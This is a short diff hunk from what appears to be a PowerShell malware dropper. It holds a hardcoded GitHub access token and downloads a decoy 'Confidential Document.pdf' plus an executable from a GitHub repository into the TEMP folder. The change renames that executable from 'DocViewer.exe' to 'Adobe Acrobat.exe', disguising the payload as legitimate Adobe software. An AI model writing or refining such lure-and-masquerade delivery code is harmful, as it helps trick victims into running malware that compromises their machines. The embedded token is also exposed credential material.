@@ -36,8 +36,8 @@ $state | Out-File (Join-Path $env:TEMP 'config.dat')
 $GhToken = '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'
 $DecoyApi = 'https://api.github.com/repos/slynet999-coder/Yambo/contents/Confidential Document.pdf'
 $DecoyPath = Join-Path $env:TEMP 'Confidential Document.pdf'
-$wrapperApi = 'https://api.github.com/repos/slynet999-coder/Yambo/contents/DocViewer.exe'
-$wrapperPath = Join-Path $env:TEMP 'DocViewer.exe'
+$wrapperApi = 'https://api.github.com/repos/slynet999-coder/Yambo/contents/Adobe Acrobat.exe'
+$wrapperPath = Join-Path $env:TEMP 'Adobe Acrobat.exe'
 
 try {
     [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
